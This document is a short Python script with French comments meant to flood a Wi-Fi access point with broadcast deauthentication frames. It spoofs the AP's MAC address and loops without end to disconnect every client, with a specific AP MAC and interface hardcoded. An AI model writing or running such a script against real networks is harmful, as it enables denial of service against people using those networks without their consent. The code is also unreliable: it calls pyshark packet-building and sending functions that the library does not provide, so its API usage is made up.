import pyshark

def deauth_all(ap_mac, interface):
    # Créer un paquet de déauthentification
    packet = pyshark.Packet()
    packet.layers.append(pyshark.Layer('Dot11'))
    packet.layers.append(pyshark.Layer('Dot11Deauth'))
    packet.layers[0].addr1 = 'ff:ff:ff:ff:ff:ff'
    packet.layers[0].addr2 = ap_mac
    packet.layers[0].addr3 = ap_mac
    packet.layers[1].reason = 7

    # Envoyer le paquet en boucle
    while True:
        packet.send(interface)
        print(f"Deauthenticating all devices from {ap_mac}")

# Remplacez par l'adresse MAC du point d'accès et l'interface réseau
ap_mac = "08:36:C9:98:11:A9"  # MAC du point d'accès
interface = "wlan1"           # Interface réseau

deauth_all(ap_mac, interface)
